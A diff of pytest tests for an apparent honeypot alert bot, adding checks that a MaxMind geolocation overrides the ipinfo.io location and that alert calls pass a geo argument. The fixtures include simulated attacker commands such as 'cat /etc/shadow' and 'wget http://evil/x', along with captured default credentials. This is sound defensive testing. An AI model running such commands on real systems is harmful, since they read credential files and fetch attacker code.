@@ -13,7 +13,7 @@ from __future__ import annotations
 
 import json
 from datetime import datetime, timedelta
-from unittest.mock import Mock
+from unittest.mock import ANY, Mock
 
 import pytest
 import requests
@@ -98,6 +98,56 @@ class TestBotResilience:
         assert bot.check_abuseipdb("192.168.1.1") == 0
         mock_get.assert_not_called()
 
+    def test_al14_geo_override_replaces_location_but_keeps_ipinfo_isp_and_abuse_score(
+        self, fresh_module, monkeypatch
+    ):
+        """The exact production inconsistency: dashboard (MaxMind, via the
+        geo dict passed here) said "United States" for an IP that ipinfo.io
+        itself geolocates as "Mumbai, IN" - get_ip_info(ip, geo=...) must
+        show the MaxMind location (matching the dashboard/Mongo-stored
+        value), not ipinfo.io's, while still using ipinfo.io for ISP/abuse
+        score, which MaxMind's City edition doesn't provide."""
+        bot = fresh_module("bot")
+
+        def fake_get(url, **kwargs):
+            if "abuseipdb.com" in url:
+                return Mock(json=lambda: {"data": {"abuseConfidenceScore": 87}})
+            return Mock(json=lambda: {
+                "city": "Mumbai", "country": "IN", "org": "AS12345 Some ISP", "loc": "19.07,72.87",
+            })
+
+        monkeypatch.setattr(requests, "get", fake_get)
+
+        info = bot.get_ip_info("206.183.111.36", geo={
+            "country": "United States", "country_code": "US",
+            "city": "New York", "latitude": 40.7, "longitude": -74.0,
+        })
+
+        assert info["location"] == "New York, US"
+        assert info["isp"] == "AS12345 Some ISP"
+        assert info["abuse_score"] == 87
+        assert info["lat"] == 40.7
+        assert info["lon"] == -74.0
+
+    def test_al15_no_geo_falls_back_to_ipinfo_location_unchanged(self, fresh_module, monkeypatch):
+        """Callers that don't have a MaxMind geo handy (e.g. telegram_commands.py,
+        if it ever calls get_ip_info) still get ipinfo.io's own location -
+        the override only kicks in when geo is actually passed."""
+        bot = fresh_module("bot")
+
+        def fake_get(url, **kwargs):
+            if "abuseipdb.com" in url:
+                return Mock(json=lambda: {"data": {"abuseConfidenceScore": 0}})
+            return Mock(json=lambda: {
+                "city": "Mumbai", "country": "IN", "org": "AS12345 Some ISP", "loc": "19.07,72.87",
+            })
+
+        monkeypatch.setattr(requests, "get", fake_get)
+
+        info = bot.get_ip_info("206.183.111.36")
+
+        assert info["location"] == "Mumbai, IN"
+
 
 # ---------------------------------------------------------------------------
 # Telegram HTML injection: attacker-controlled fields must be escaped before
@@ -162,7 +212,7 @@ class TestRealtimeAlertRouting:
             make_login_failed_event(src_ip="203.0.113.7", username="root", password="123456")
         )
 
-        mocks["alert_login_failed"].assert_called_once_with("203.0.113.7", "root", "123456", 1)
+        mocks["alert_login_failed"].assert_called_once_with("203.0.113.7", "root", "123456", 1, geo=ANY)
         mocks["alert_login_success"].assert_not_called()
         mocks["alert_session_commands"].assert_not_called()
 
@@ -174,7 +224,7 @@ class TestRealtimeAlertRouting:
             make_login_success_event(src_ip="203.0.113.7", username="root", password="toor")
         )
 
-        mocks["alert_login_success"].assert_called_once_with("203.0.113.7", "root", "toor")
+        mocks["alert_login_success"].assert_called_once_with("203.0.113.7", "root", "toor", geo=ANY)
         mocks["alert_login_failed"].assert_not_called()
         mocks["alert_session_commands"].assert_not_called()
 
@@ -210,7 +260,7 @@ class TestRealtimeAlertRouting:
         realtime_alert.process_event(make_closed_event(session="sessA", src_ip="203.0.113.7"))
 
         mocks["alert_session_commands"].assert_called_once_with(
-            "203.0.113.7", ["whoami", "cat /etc/shadow"]
+            "203.0.113.7", ["whoami", "cat /etc/shadow"], geo=ANY
         )
         # session cache is cleared once the session closes
         assert "sessA" not in realtime_alert.SESSION_CACHE
@@ -301,7 +351,7 @@ class TestRealtimeAlertRouting:
 
         mocks["alert_login_success"].assert_called_once()
         mocks["alert_session_commands"].assert_called_once_with(
-            "203.0.113.7", ["wget http://evil/x"]
+            "203.0.113.7", ["wget http://evil/x"], geo=ANY
         )
 
     def test_al13e_login_failed_and_login_success_have_independent_cooldowns(
@@ -709,7 +759,7 @@ class TestHttpHoneypotAlert:
 
         http_honeypot_alert.process_pending_login_attempts()
 
-        mock_alert.assert_called_once_with("203.0.113.7", "admin", "toor123", "/admin/login.php")
+        mock_alert.assert_called_once_with("203.0.113.7", "admin", "toor123", "/admin/login.php", geo=ANY)
         stored = http_honeypot_alert.collection.find_one({"_id": doc})
         assert stored["alerted"] is True
 
